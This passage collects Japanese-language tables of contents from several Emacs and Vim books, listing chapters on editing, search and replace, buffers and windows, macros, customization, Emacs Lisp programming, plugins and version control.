		2.1.5 　 Emacs コマンドとキー操作
	2.2 　テキストの削除
		2.2.1 　キルリング
	2.3 　マークしたテキストの削除、移動、コピー
		2.3.1 　テキストのコピー
		2.3.2 　以前に削除した内容を再挿入する
		2.3.3 　選択と貼り付け
	2.4 　クリップボードの操作
		2.4.1 　クリップボードへのテキスト入力
		2.4.2 　クリップボードからのテキスト取り出し
	2.5 　編集上のトリックとショートカット
		2.5.1 　誤った文字順の修正
		2.5.2 　大文字小文字の変換
		2.5.3 　上書きモード（ Ovwrt モード）
	2.6 　コマンドの中止と変更の取り消し
		2.6.1 　コマンドの中止
		2.6.2 　操作の取り消し（ undo ）
		2.6.3 　ファイルからバッファの内容を戻す
		2.6.4 　バックアップファイルを用いて以前の版に戻る
		2.6.5 　失った変更の復元
	2.7 　 Emacs のカスタマイズ
		2.7.1 　ツールバーを非表示にする
		2.7.2 　 CUA モードでの C-x 、 C-c 、 C-v による切り取り、コピー、貼り付け
		2.7.3 　 Text モードと auto-fill モードを自動的に有効にする
		2.7.4 　キーバインドの変更
		2.7.5 　起こりがちな問題

3 章　検索と置換
	3.1 　様々な検索方法
		3.1.1 　インクリメンタル検索
		3.1.2 　単純検索
		3.1.3 　単語検索
	3.2 　検索と置換
		3.2.1 　単純検索と置換
		3.2.2 　問い合わせ置換
		3.2.3 　問い合わせ置換（とその他の複雑なコマンド）の再実行
		3.2.4 　再帰編集
		3.2.5 　検索時の大文字小文字の区別
		3.2.6 　検索、置換作業のための正規表現
	3.3 　 Ispell を使用したスペルチェック
		3.3.1 　バッファのチェック
		3.3.2 　単語のスペルチェック
		3.3.3 　スペルの補完
		3.3.4 　 Flyspell を用いてスペルの即時チェックをする
	3.4 　単語略称機能
		3.4.1 　動的略称機能
		3.4.2 　単語略称モード
		3.4.3 　起こりがちな問題

4 章　バッファとウィンドウおよびフレームの利用
	4.1 　バッファ、ウィンドウ、フレームについて理解する
		4.1.1 　ウィンドウとフレームの違い
		4.1.2 　ウィンドウやフレームとは独立したバッファ
		4.1.3 　バッファの詳細
	4.2 　複数バッファの取り扱い
		4.2.1 　バッファの切り替え
		4.2.2 　バッファの消去
	4.3 　ウィンドウの取り扱い
		4.3.1 　ウィンドウの上下分割
		4.3.2 　ウィンドウ間の移動
		4.3.3 　ウィンドウの削除
	4.4 　フレームの操作
		4.4.1 　新しいフレームの作成
		4.4.2 　フレーム間の移動
		4.4.3 　フレームの削除と最小化
	4.5 　様々なバッファ操作
		4.5.1 　複数バッファの保存
		4.5.2 　バッファ名の変更
		4.5.3 　読み込み専用バッファ
		4.5.4 　バッファリストの取得
		4.5.5 　バッファリストの操作
	4.6 　高度なウィンドウ操作
		4.6.1 　垂直（つまり左右）に分割されたウィンドウの作成
		4.6.2 　ウィンドウ間の移動
		4.6.3 　ウィンドウの拡大と縮小
		4.6.4 　ウィンドウサイズの制限
		4.6.5 　 2 つのウィンドウのファイルを比較する
	4.7 　ブックマークの利用
		4.7.1 　ブックマークの作成
		4.7.2 　ブックマークへの移動
		4.7.3 　ブックマークの名前変更と削除
		4.7.4 　ブックマークリストの操作
		4.7.5 　ブックマークへの注記
		4.7.6 　その他のブックマークコマンド

5 章　作業環境としての Emacs
	5.1 　シェルバッファでのコマンドの実行
		5.1.1 　コマンドを 1 つずつ実行
		5.1.2 　 Shell モード
	5.2 　 Dired を用いたディレクトリ操作
		5.2.1 　ファイルの表示と編集
		5.2.2 　ファイルの削除、コピー、名前変更
		5.2.3 　ファイルの圧縮と展開
		5.2.4 　ファイルの比較
		5.2.5 　ファイルに対するシェルコマンドの実行
		5.2.6 　複数のファイルの操作
		5.2.7 　ディレクトリ間の移動
	5.3 　 Emacs での印刷の実行
	5.4 　 man ページの表示
	5.5 　時間管理ツール
		5.5.1 　カレンダの表示
		5.5.2 　ダイアリ機能
		5.5.3 　起こりがちな問題

6 章　マクロの記述
	6.1 　マクロの定義
	6.2 　よいマクロを作るコツ
	6.3 　より複雑なマクロの例
	6.4 　マクロの編集
	6.5 　マクロリング
	6.6 　マクロにキーを割り当てる
	6.7 　マクロの名前付け、保存、実行
	6.8 　複雑なマクロの作成
		6.8.1 　マクロの一時停止とキーボード入力
		6.8.2 　問い合わせの追加
	6.9 　リージョンでのマクロ実行
	6.10 　マクロの先にあるもの

7 章　簡単なテキスト整形機能と特殊編集機能
	7.1 　タブ機能
		7.1.1 　 Emacs 21 におけるタブ機能のデフォルト設定
		7.1.2 　タブ位置の変更
		7.1.3 　タブ文字そのものが必要な場合
		7.1.4 　タブ幅の変更
		7.1.5 　タブとスペース
		7.1.6 　タブをスペースに変更（あるいはその逆）
	7.2 　インデント
		7.2.1 　パラグラフのインデント
		7.2.2 　パラグラフ 1 行目のインデント
		7.2.3 　インデントされたパラグラフの行揃え
		7.2.4 　マージンの変更
		7.2.5 　行揃え接頭辞の使用
	7.3 　センタリング
	7.4 　 Outline モード
		7.4.1 　 Outline モードの開始
		7.4.2 　テキストの隠蔽と表示
		7.4.3 　テキスト隠蔽時の編集
		7.4.4 　マークの設定
		7.4.5 　セクションの昇格と降格
		7.4.6 　マイナーモード
	7.5 　矩形編集
		7.5.1 　 CUA 矩形編集
	7.6 　簡単な図の作成
		7.6.1 　 Picture モードでの作図
		7.6.2 　 Picture モードでの編集
		7.6.3 　 Artist モード（素晴らしきマウス使い）
		7.6.4 　起こりがちな問題

8 章　マークアップ言語の編集
	8.1 　コメント
	8.2 　 Font-Lock モード
	8.3 　 HTML の編集
		8.3.1 　 HTML モード
		8.3.2 　 HTML helper モードの使い方
	8.4 　 XML の記述
		8.4.1 　 SGML モードによる XML の記述
		8.4.2 　 TEI Emacs を用いた XML の編集
		8.4.3 　 nxml モードでの XHTML 記述
		8.4.4 　 psgml モードの利用
	8.5 　 TEX と LATEX の編集
		8.5.1 　カッコの対応づけ
		8.5.2 　引用符と段落
		8.5.3 　コマンドの組
		8.5.4 　テキストの TeX 処理と印刷

9 章　プログラミング言語の編集
	9.1 　統合開発環境としての Emacs
		9.1.1 　コンパイルとデバッグ
	9.2 　コード作成
		9.2.1 　言語モード
		9.2.2 　コメント
		9.2.3 　ソースコードのインデント
		9.2.4 　 etags
		9.2.5 　フォントと Font-Lock モード
	9.3 　 C モードと C++ モード
		9.3.1 　カーソル移動コマンド
		9.3.2 　インデントスタイルのカスタマイズ
		9.3.3 　 C/C++ モードのその他の機能
		9.3.4 　 C++ モードでの違い
	9.4 　 Java サポート
		9.4.1 　 Java モード
	9.5 　 JDEE （ Emacs 用 Java 開発環境）
		9.5.1 　インストールの準備
		9.5.2 　 CEDET のインストール
		9.5.3 　 ELisp ライブラリのインストール
		9.5.4 　 JDEE のインストール
		9.5.5 　 Java ツールの登録
		9.5.6 　 JDEE での編集
		9.5.7 　 JDEE でのコンパイルと実行
		9.5.8 　 JDEE でのデバッグ
		9.5.9 　 JDEE をさらに利用するために
	9.6 　 Perl サポート
		9.6.1 　 Perl に関する警告
	9.7 　 SQL サポート
		9.7.1 　前提要件
		9.7.2 　 SQL 操作モード
	9.8 　 Lisp モード
		9.8.1 　 Lisp モードにおけるインデント
		9.8.2 　 Lisp モードでのコメント
		9.8.3 　各 Emacs-Lisp モードの違い
		9.8.4 　 Lisp モードの違い
		9.8.5 　小さな Lisp コードの編集

10 章　 Emacs のカスタマイズ
	10.1 　 Custom によるカスタマイズ
		10.1.1 　 Custom の操作
		10.1.2 　共通オプション
		10.1.3 　 Custom によるカスタマイズ
		10.1.4 　 Abbrev モードの設定例
		10.1.5 　［ Options ］メニュー
		10.1.6 　 Dired の設定例
		10.1.7 　カスタマイズ変数の探し方
	10.2 　.emacs の編集
		10.2.1 　 Custom と.emacs の比較
		10.2.2 　.emacs 設定入門
		10.2.3 　.emacs ファイルの例
	10.3 　フォントと配色の変更
		10.3.1 　対話的なフォントの変更
		10.3.2 　自動のハイライト表示と色付けについての設定
		10.3.3 　 Custom によるフォントのカスタマイズ
		10.3.4 　色の変更
		10.3.5 　装飾テキストの保存
	10.4 　キーバインドのカスタマイズ
		10.4.1 　特殊キーの設定
		10.4.2 　キーバインドの解除
	10.5 　 Emacs 変数の設定
	10.6 　 Emacs Lisp パッケージの検索
	10.7 　 auto-mode のカスタマイズを行い、最初のモードを設定する
	10.8 　 Emacs を自分の思ったように動かす

11 章　 Emacs Lisp プログラミング
	11.1 Lisp 入門
		11.1.1 Lisp の基本要素
		11.1.2 関数の定義
		11.1.3 Lisp 関数を Emacs のコマンドにする
	11.2 Lisp の基本関数
		11.2.1 複文
		11.2.2 制御構文
	11.3 便利な組み込み関数
		11.3.1 バッファ、テキスト、リージョン
		11.3.2 正規表現
		11.3.3 標準ライブラリは宝の山
		11.3.4 正規表現を利用する関数
		11.3.5 その他の組み込み関数
	11.4 自動テンプレートシステムの構築
	11.5 メジャーモードのプログラミング
		11.5.1 メジャーモードのコンポーネント
		11.5.2 さらに Lisp の基本：リスト
		11.5.3 電卓モード
		11.5.4 電卓モードの Lisp コード
	11.6 既存のモードのカスタマイズ
	11.7 独自の Lisp ライブラリの構築
		11.7.1 Lisp ファイルのバイトコンパイル

12 章　バージョン管理
	12.1 　バージョン管理の使用
	12.2 　バージョン管理の概念
	12.3 　 VC による基本操作の補助集
	12.5 　 VC コマンドの概要
	12.6 　 VC モードのインジケータ
	12.7 　バージョン管理システムの選択
	12.8 　 VC のコマンド
		12.8.1 　ファイルのグループとサブツリーの取り扱い
		12.8.2 　差分のレポート
		12.8.3 　以前のリビジョンの抽出
		12.8.4 　変更履歴の表示
		12.8.5 　ファイルの登録
		12.8.6 　バージョン管理ヘッダの挿入
		12.8.7 　スナップショットの作成と復元
		12.8.8 　 ChangeLog ファイルの更新
		12.8.9 　バージョン管理下にあるファイルの名称変更
		12.8.10 　 VC が混乱したら
	12.9 　 VC のカスタマイズ
	12.10 　 VC の拡張
	12.11 　 VC の限界
	12.12 　 VC の有効活用
	12.13 　 Ediff による比較
		12.13.1 　 Ediff の起動
		12.13.2 　 Ediff によるファイル比較
		12.13.3 　相違点をマークする
		12.13.4 　 Ediff の終了
		12.13.5 　混乱状態からの回復
		12.13.6 　 Ediff についてさらに学習するために
		12.13.7 　 Ediff のカスタマイズ
		12.13.8 　 Ediff を自動的に起動する

13 章　ヘルプシステム
	13.1 　チュートリアル
	13.2 　ヘルプコマンド
		13.2.1 　詳細情報
		13.2.2 　 apropos コマンド
	13.3 　複雑なコマンドのヘルプ
	13.4 　 Emacs ドキュメントの閲覧
		13.4.1 　 Info の使用
		13.4.2 　 FAQ 、ニュース、アンチニュース
	13.5 　補完
		13.5.1 　補完のカスタマイズ

付録 A 　 Emacs の変数
付録 B 　 Emacs Lisp パッケージ
付録 C 　バグとバグフィックス
付録 D 　 Emacs 関連サイト
付録 E 　クイックリファレンス

用語集
索引
***** emacs jissen
本書に寄せて
はじめに
謝辞
本書の構成
サンプルコードのダウンロード
Emacs Lisp の構文
1 章　 Emacs の世界へようこそ
1.1 　多くの人に愛される歴史あるエディタ
ユーザが自由に機能を変更・追加できる
使いこなせば強力な味方になる
本当は難しくない Emacs
1.2 　本当のエディタにできること
エディタが本来持つべき機能
1.3 　 Emacs が Emacs であるための特徴
優れた操作性
設定の柔軟性
本体の拡張性
2 章　インストール，設定ファイルと画面の構成
2.1 　インストール
Mac へのインストール
Emacs.app を入手する
Emacs.app を自分でビルドする
Windows へのインストール
オフィシャルビルドを利用する
NTEmacs ， gnupack を利用する
Linux へのインストール
ターミナル環境へのインストール
2.2 　ディレクトリと設定ファイルの構成
各ディレクトリの役割
etc ディレクトリ
leim ディレクトリ
lisp ディレクトリ
site-lisp ディレクトリ
bin ディレクトリ
ホームディレクトリに作成される.emacs.d ディレクトリ
Windows のホームディレクトリ設定
設定ファイルの構成
2.3 　画面の構成
フレーム
ウィンドウ
フリンジ
バッファ
[Column] 　 Emacs は終了しない？
モードライン
ミニバッファ（エコーエリア）
2.4 　モード
メジャーモード
メジャーモードを選択するしくみ
メジャーモードが提供する機能
マイナーモード
マイナーモードが提供する機能
[Column] 　アラインメント機能を使ってきれいなコードを書く
3 章　基本的な操作
3.1 　コマンド
入力して実行する
キーバインドから実行する
コマンドの表記方法
キーバインドの表記方法
キーバインドの表記サンプル
プレフィックスキー（起点キー）
3.2 　起動と終了
起動する
Emacs デーモンで起動を高速化する
[Column] 　困ったときは C-g でキャンセル
デバッグモードでの起動
終了する
3.3 　ファイル（バッファ）を開く，保存する
ファイル（バッファ）を開く── C-x C-f
ファイル（バッファ）を保存する── C-x C-s
すべてのファイル（バッファ）を保存する── C-x s
バックアップファイル
オートセーブファイル
別名で保存する── C-x C-w
バッファに別ファイルを挿入する── C-x i
文字コード・改行コードを変換する── C-x RET f
文字コード・改行コードを変換して開き直す── C-x RET r
バッファを切り替える── C-x b
バッファを消去する── C-x k
3.4 　カーソル移動
キーバインド一覧
Emacs のホームポジション
3.5 　文字の入力や文字列の操作
マークとリージョン── C-SPC
コピーとカット── M-w ， C-w
行を消去する── C-k
ペーストする── C-y ， C-y M-y ……
コメントする，コメントを解除する── M-;
[Column] 　ちょっと便利なリージョン選択方法
特殊文字を入力する── C-q
アンドゥ── C-/ ， C-_， C-x u
3.6 　 Emacs の正規表現
特別な文字
3.7 　検索と置換
grep による検索
インクリメンタル検索── C-s ， C-r ， C-M-s ， C-M-r
対話置換，一括置換── M-%， C-M-%
ナローイングでバッファの一部のみを編集する
3.8 　ウィンドウ操作
ウィンドウを分割する── C-x 2 ， C-x 3
ウィンドウを移動する── C-x o
分割したウィンドウを閉じる── C-x 1 ， C-x 0
3.9 　ディレクトリ操作（ Dired ）
3.10 　キーボードマクロによる繰り返し操作
基本的な使い方
名前を付ける
再利用するために保存する
3.11 　表示の変更
文字サイズをすぐに変更する── C-x C-+ ， C-x C-=， C-x C--， C-x C-0
行の折り返し表示を変更する── M-x toggle-truncate-lines
3.12 　ヘルプの利用
info ── M-x info
ヘルプコマンド── C-h ，<f1>
よく利用するヘルプコマンド
C-h a 文字列 RET
C-h b
C-h k キーバインド
C-h w コマンド名 RET
C-h f 関数名 RET
C-h v 変数名 RET
日本語ドキュメント
4 章　設定ファイルの管理方法
4.1 　効率的な設定ファイルの作り方と管理方法
~/.emacs.d ディレクトリに設定をまとめて管理
サブディレクトリの構成
Elisp をどのように配置すべきか
Elisp 配置用のディレクトリを作成する
ロードパスを追加する
設定を反映するには
設定を分割して管理
ファイルを分ける
init-loader.el を利用する
4.2 　環境に応じた設定の分岐
OS の違いによる分岐
CUI と GUI による分岐
Emacs のバージョンによる分岐
4.3 　拡張機能の読み込み方
require と autoload の違い
require
autoload
コマンドがある場合のみ読み込む
4.4 　 Web サービスを用いたバックアップ
GitHub
~/projects/dotfiles ディレクトリに設定ファイルを移動する
シンボリックリンクを利用する
Git にコミットする
GitHub へプッシュする
Dropbox
[Column] 　エディタ採用
5 章　本体の設定
5.1 　設定を反映する方法
C-x C-e と C-j による評価
その他の評価
5.2 　キーバインドの設定
キーマップ
キーバインドの優先順位
キーバインドの割り当て
お勧めのキー操作
改行と同時にインデントする
[Column] 　 C-h をバックスペースにする
行の折り返し表示を切り替える
簡単にウィンドウを切り替える
5.3 　環境変数の設定
パスの設定
文字コードの設定
現在の文字コード設定を調べる
文字コードを指定する
ファイル名の扱い
5.4 　フレームに関する設定
モードラインに関する設定
行番号／カラム番号を表示する
ファイルサイズ，時計，バッテリー残量を表示する
タイトルバーにファイルのフルパスを表示
ウィンドウ左に行番号を表示
5.5 　インデントの設定
タブ文字の表示幅
タブ文字の利用
C ， C++ ， JAVA ， PHP などのインデント
5.6 　表示・装飾に関する設定
フェイス
表示テーマの設定
フォントの設定
英語フォントを指定する
日本語フォントを指定する
フォントの横幅を調節する
5.7 　ハイライトの設定
現在行のハイライト
対応する括弧のハイライト
5.8 　バックアップとオートセーブ
オートセーブファイルからの復元
バックアップとオートセーブの設定
バックアップとオートセーブファイルの作成先を変更する
オートセーブの間隔を変更する
5.9 　フック
自動化のしくみ
利用方法
無名関数 lambda を使う場合
関数を定義する場合
代表的なフック一覧
[Column] 　簡単な計算は*scratch*バッファで
6 章　テキスト編集をさらに効率化する拡張機能
6.1 　 Elisp をインストールしよう
標準的なインストール方法
auto-install を導入する
バイトコンパイル
byte-compile-file コマンド
シェルからバイトコンパイルする
拡張機能の自動インストール── auto-install
利用可能にする
利用する
[Column] 　拡張機能の設定方法を調べるには
Emacs Lisp Package Archive （ ELPA ）── Emacs Lisp パッケージマネージャ
Emacs 23 へ package.el をインストールする
ELPA のパッケージ一覧を取得する
パッケージ一覧から選択してインストールする
コマンドから直接インストールする
インストール先のディレクトリ構成と設定のしくみ
6.2 　統一したインタフェースでの操作
候補選択型インタフェース── Anything
インストールする
利用可能にする
ファイルを開く・バッファを切り替える
キーバインドを一覧表示する── describe-bindings
過去の履歴からペーストする── anything-show-kill-ring
moccur を利用する── anything-c-moccur
6.3 　入力の効率化
補完入力の強化── Auto Complete Mode
インストールする
利用可能にする
補完候補をポップアップ＆絞り込む
6.4 　検索と置換の拡張
検索結果のリストアップ── color-moccur
インストールする
利用可能にする
代表的なコマンド
マルチバッファを検索し結果をリストアップする
カレントバッファを検索し結果をリストアップする
moccur の結果を直接編集── moccur-edit
インストールする
利用可能にする
mocccur の結果を編集する
編集を終了したときにファイルを自動保存する
grep の結果を直接編集── wgrep
インストールする
利用可能にする
grep の結果を編集する
6.5 　さまざまな履歴管理
編集履歴の記憶── undohist
インストールする
利用可能にする
ファイルを閉じたあとにアンドゥする
アンドゥの分岐履歴── undo-tree
インストールする
利用可能にする
樹形図を見ながらアンドゥする
カーソルの移動履歴── point-undo
インストールする
利用可能にする
カーソル位置を戻す／やりなおす
6.6 　ウィンドウ管理
分割状態を管理── ElScreen
インストールする
利用可能にする
スクリーンを作成する
スクリーンを移動する
代表的なキーバインド
6.7 　メモ・情報整理
メモ書き・ ToDo 管理── howm
インストールする
利用可能にする
howm-menu を起動する
メモを書く
保存と同時に閉じる
アウトラインエディタ── org-mode
アウトライン編集機能
箇条書きなどを入力する
表を入力する
6.8 　特殊な範囲の編集
矩形編集── cua-mode
利用可能にする
各行頭に文字を追加する
各行頭の文字を削除する
連番を入力する
7 章　開発をさらに効率化する拡張機能
7.1 　各種言語の開発環境
HTML
html-mode
html-mode を利用してタグを入力する
html-mode が自動選択されるしくみ
nxml-mode
nxml-mode を HTML 編集のデフォルトモードに
nxml-mode で構文チェックする
HTML5 を nxml-mode で編集する
nxml-mode の基本設定
CSS
cssm-mode
cssm-mode の基本設定
auto-complete による補完を利用する
JavaScript
標準の js-mode
構文チェック機能を備えた js2-mode
js2-mode をインストールする
js2-mode が持つインデントの不具合を解決する
PHP
php-mode
オンラインドキュメントを利用する
php-mode のインデントを調整する
PHP 補完入力── php-completion
Perl
cperl-mode
[Column] 　便利なエイリアス
cperl-mode のインデントを調整する
yaml-mode
Perl 補完入力── perl-completion
Ruby
ruby-mode のインデントを調整する
Ruby 編集用の便利なマイナーモードを利用する
Emacs から irb を利用する── inf-ruby
Python
python-mode.el
PyCheker で構文をチェックする
そのほかの構文チェックツール── pep8 ， pyflakes ， flake8 ， pylint
C/C++
cc-mode
cc-mode 付属のマイナーモード
c-mode-common-hook とそれぞれのフック
7.2 　 Flymake による文法チェック
Flymake を利用できる言語
Perl の Flymake 設定から学ぶ
C 言語系
Makefile があれば利用し，なければ直接コマンドを実行する
XML と HTML
JavaScript
jsl をインストールする
jsl を利用可能にする
Ruby
Python
7.3 　タグによるコードリーディング
Etags 以外のタグ作成プログラム
gtags と Emacs の連携
gtags.el をインストールする
gtags-mode の使い方
ctags と Emacs の連携
ctags.el をインストールする
Anything とタグの連携
anything-for-tags コマンドを作成する
7.4 　フレームワーク専用拡張機能
Rinari ── Ruby on Rails Minor Mode for Emacs
インストールする
ナビゲーション機能でファイルを移動する
よく利用する Rinari コマンド
CakePHP Minor Mode ── emacs-cake
インストールする
ナビゲーション機能でファイルを移動する
auto-complete と連携する
7.5 　特殊な文字の入力補助
絵文字の入力補助── emoji.el
インストールする
利用する
7.6 　差分とマージ
diff による差分表示── M-x diff
Ediff による差分表示── M-x ediff
利用する
同一フレーム内にコントロールパネルを表示する
キーバインド一覧
Ediff によるパッチの適用── M-x epatch
Ediff によるマージ── M-x ediff-merge
7.7 　 Emacs からデータベースを操作
データベースへの接続
MySQL へ接続する── sql-interactive-mode
sql-mode との連携
7.8 　バージョン管理
Emacs 標準のバージョン管理機能
Subversion フロントエンド── psvn
インストールする
利用する
Git フロントエンド── Egg
インストールする
利用する
7.9 　シェルの利用
シェルコマンドの実行── M-!
カレントファイルへ結果を出力する── C-u M-!
バッファの内容を標準入力として利用する── M-|
ターミナルの利用── multi-term
インストールする
利用する
7.10 　 TRAMP によるサーバ接続
sudo ， su による編集
バックアップファイルを作成しない
7.11 　ドキュメント閲覧・検索
Emacs 版 man ビューア（ WoMan ）の利用
利用可能にする
Anything による man 検索
Appendix 　最新情報を入手するには
A.1 　開発状況
フリーソフトウェアとしての Emacs
ソースコードリポジトリ
Bazaar を利用してソースコードを取得する
Git を利用してソースコードを取得する
A.2 　開発版の試用
開発版のビルド
README を読む
configure ファイルを作成する
A.3 　新しい情報に触れるには
メーリングリスト
EmacsWiki ──世界の Emacs コミュニティ
メーリングリスト， Wiki ，その先へ
[Column] 　 Google Maps も使える Emacs
***** emacs desktop ref
はじめに
1 章　 Emacs の基本
2 章　ファイルの編集
3 章　検索置換
4 章　バッファとウィンドウの使用
5 章　作業環境としての Emacs
6 章　電子メールとニュースグループ
7 章　 Emacs とインターネット
8 章　シンプルなテキストフォーマッティングと特殊な編集
9 章　テキストのマークアップ
10 章　マクロを書く
11 章　 Emacs のカスタマイズ
12 章　プログラミングコマンド
13 章　バージョンコントロール
14 章　オンラインヘルプ
***** vim tec
Chapter01 　環境設定を改善する
1-1 　プロジェクトごとにファイルを管理する
1-2 　 project.vim を使いやすくする
1-3 　ディレクトリごとに設定ファイルを用意する
1-4 　 vimrc で外部の設定ファイルを取り込む
1-5 　選択した範囲に記述された Vim スクリプトのコードを実行する
1-6 　ファイルごとに Vim エディタのオプションを設定する
1-7 　日本語ヘルプを導入する
1-8 　ヘルプを grep 検索する
1-9 　日本語入力を簡単に行う
1-10 　ノーマルモードと挿入モードをステータスラインの色で区別する
1-11 　不可視文字を表示する
1-12 　 GUI 版の Vim 用のカラースキームを CUI 版の Vim でも使用する
1-13 　 autocmd を使用して自動的に処理を実行する
1-14 　 Vim プラグインを管理する
Chapter02 　ファイル操作を改善する
2-1 　バッファへ簡単に移動する
2-2 　 vimfiler を用いてファイル操作を行う
2-3 　一般ユーザで開いたファイルを管理者権限で保存する
2-4 　遠隔地のファイルを編集する
2-5 　バイナリファイルを編集する
2-6 　ファイル名を一括で変換する
2-7 　ファイルの文字コードを変換する
2-8 　ファイルフォーマットを変換する
2-9 　最後の編集位置にカーソルを自動的に移動させる
2-10 　カレントディレクトリを編集中のファイルと同じディレクトリに変更する
2-11 　カレントファイルのファイルパスを一部だけ変更したファイルを開く
2-12 　クラッシュ前の状態までリカバリする
2-13 　クラッシュした無名のバッファをリカバリする
2-14 　スワップファイルが見つかった時に自動的に読み取り専用でファイルを開く
2-15 　余計な Vim エディタが起動しないようにする
2-16 　ツリー形式でファイルの編集履歴を表示する
Chapter03 　比較・検索方法を改善する
3-1 　 grep 検索を使いこなす
3-2 　複数の検索パターンに同時にマッチする行を検索する
3-3 　ビジュアルモードで選択されたテキストのみを対象に置換処理を実行する
3-4 　正規表現のキーワードを無効にした検索を行う
3-5 　検索パターンにマッチしないワードを検索する
3-6 　 grep にプレビュー表示と絞り込み検索を追加する
3-7 　ローマ字入力のまま日本語をインクリメンタル検索する
3-8 　フォールディングを使用してファイルを見やすくする
3-9 　ディレクトリをブックマークして後で戻ってこれるようにする
3-10 　 Netrw のマーク機能を利用して複数ファイルを一括で編集する
3-11 　ファイル中の選択した部分のテキストだけを比較する
3-12 　ディレクトリ内のファイルを再帰的に比較する
3-13 　細かい単位で移動履歴を辿る
3-14 　 visualstar.vim でビジュアルモードで選択したテキストで検索する
3-15 　ペーストしたテキストをビジュアルモードで選択する
3-16 　マークをエディタ上で表示してジャンプする先を見やすくする
Chapter04 　作業効率を改善する
4-1 　スクラッチバッファ・一時ファイルを使用する
4-2 　ヤンク・レジスタ・コマンド履歴・検索履歴を共有する
4-3 　他のアプリケーションとテキストデータをやりとりする
4-4 　複数のテキストデータをコピーして一度に持ち運ぶ
4-5 　ヤンクしたテキストを別の Vim エディタでペーストする
4-6 　ヤンクした文字列とカーソル位置の単語を置換する
4-7 　履歴を利用して過去に実行したコマンドを再実行する
4-8 　コマンドラインでも word 単位でカーソルを移動する
4-9 　目的の単語へ素早くカーソルを移動する
4-10 　%コマンドによるジャンプ機能を拡張する
4-11 　フォントサイズを変更する
4-12 　スクリーンのサイズを切り替える
4-13 　独自のシンタックスハイライトを作成する
4-14 　インデント量の違いをハイライト表示する
4-15 　名前付きレジスタを編集に活用する
4-16 　検索結果ハイライトを ESC キーの連打でリセットする
4-17 　 speeddating.vim で日付をインクリメント操作する
4-18 　 VimCalc を使用して Vim エディタ上で計算処理を行う
Chapter05 　編集方法を改善する
5-1 　インデントを崩さないようにペーストする
5-2 　複数行の行頭に同じ文字列を挿入する
5-3 　 Vim エディタで線を引く
5-4 　 Vim エディタで図を描画する
5-5 　 0 から始まる数値を 10 進数でインクリメントする
5-6 　全角文字を半角文字に変換する
5-7 　変数名を命名規則に従って変換する
5-8 　 Vim エディタで URL エンコードをかける
5-9 　文章を右揃え・中央揃えに整形する
5-10 　選択した範囲のインデントサイズを連続して変更する
5-11 　 Align でテキストファイルを整形する
5-12 　パターンマッチした行にだけ Align の整形処理を実行する
5-13 　テキストオブジェクトを使用する
5-14 　テキストオブジェクトを括弧やダブルクォートで囲む
5-15 　テキストオブジェクト機能を拡張する
5-16 　 surround.vim の機能を繰り返し使用する
Chapter06 　開発効率を改善する
6-1 　タグファイルを使用する
6-2 　タグファイルを用いてブラウジングする
6-3 　ソースコードをコメントアウトする
6-4 　 man を参照する
6-5 　 API ドキュメントを参照する
6-6 　 QuickFix を使いこなす
6-7 　コンパイラープラグインを使用する
6-8 　 errormarker.vim でエラー行を目立たせる
6-9 　使い捨てのシェルスクリプトを無名バッファ上で組み立てる
6-10 　 quickrun.vim でプログラムを実行して結果を確認する
6-11 　 vimshell を用いて Vim からシェルのコマンドを実行する
6-12 　 vimshell を用いてインタプリタと通信する
6-13 　 Conque を用いて Vim を疑似端末とする
Chapter07 　記録の取り方を改善する
7-1 　 gist でテキストを共有する
7-2 　カレンダー機能を使用する
7-3 　テキストファイルを HTML 化する
7-4 　文字数を数える
7-5 　日本語文書をフォーマット整形する
7-6 　 autodate.vim でタイムスタンプを自動的に更新する
7-7 　 Web サービスを使用する
7-8 　 QFixHowm を導入する
7-9 　 QFixHowm でメモ作成・一覧表示・削除を行う
7-10 　 QFixHowm で「日記」や「特定ファイルと対になるメモ」を書く
7-11 　 QFixHowm でメモの全文検索と絞り込みを行う
7-12 　 QFixHowm で予定・ TODO を管理する
7-13 　 QFixHowm でアウトライン機能を使用する
7-14 　 QFixHowm で記録したメモを HTML 出力する
7-15 　 QFixHowm のメモに Markdown 形式を利用する
Chapter08 　置換処理を改善する
8-1 　複数ファイルを一括で加工する
8-2 　 qfreplace.vim で複数のファイルを一気に置換する
8-3 　マクロを利用して大規模な編集処理を実現する
8-4 　 Expression レジスタを使用して Vim スクリプトの式の値を取得する
8-5 　検索にマッチしたテキストを Vim スクリプトの式の値で置換する
8-6 　テキストファイルをソートする
8-7 　重複する行を削除する
8-8 　プログラミング言語 Perl の tr/// 演算子のような変換を行う
8-9 　各行のフィールドの並び順を変更する
8-10 　一覧の並び順を入れ替える
8-11 　連番を生成する
8-12 　条件にマッチする行にだけ Vim のコマンドを実行する
8-13 　外部プログラムを使用してフィルタリング処理する
8-14 　 Perl プログラムを使用してテキストを加工する
8-15 　 Python プログラムを使用してテキストを加工する
8-16 　 Vim エディタで標準入力をフィルターし標準出力に結果を出力する
Chapter09 　入力速度を改善する
9-1 　短縮入力を使用して入力量を減らす
9-2 　コマンドにマップを定義してプラグインの機能を実行しやすくする
9-3 　ユーザ定義コマンドを設定する
9-4 　 smartchr を使用して = の両端にスペースを楽に入力する
9-5 　ソースコード中の true ・ false をトグルで置き換える
9-6 　 altercmd でエイリアスを定義する
9-7 　 zencoding で高速に入力する
9-8 　 zencoding をより活用する
9-9 　入力を補完する
9-10 　 neocomplcache を使用して自動補完する
9-11 　 neocomplcache を設定する
9-12 　 neocomplcache の source を自作する
9-13 　 neocomplcache を使用してスニペット展開を行う
9-14 　 neocomplcache のスニペットを自作する
9-15 　 SKK 入力を使用する
Chapter10 　 unite.vim を使いこなす
10-1 　 unite.vim を使用して Vim のインタフェースを改善する
10-2 　 unite.vim のキーマッピングを知る
10-3 　 unite.vim の source を知る
10-4 　 unite.vim とプラグインを連携させる
10-5 　 unite.vim を本格的にカスタマイズする
10-6 　 unite.vim の buffer-name-option を知る
10-7 　 unite.vim の高度なトピック
10-8 　 unite.vim に自分の source を追加する
10-9 　 unite.vim の source ・ kind ・ action の概念を知る
10-10 　 unite.vim の高度なトピック（自作編）
10-11 　非同期の unite.vim source を作成する
***** emacs tec
1) プログラミング言語 elisp の基礎を知る
2) バッファとウィンドウによる表現方法を学ぶ
3) 関数を少しずつ覚えていく
4) オンラインヘルプの使い方を学ぶ
5) 応用的な知識をつける
6) Common Lisp マクロを使ってエレガントに表現する
7) テスト、デバッグ方法を知る
8) 実際に elisp で書いてみる
***** emacs 150
 3 ■■はじめに
 13 ■■本書を読む前に

 19 ■■■ Chapter01 　設定に必要な最低限の Emacs Lisp の知識
 20 ■本章に入る前の基礎知識
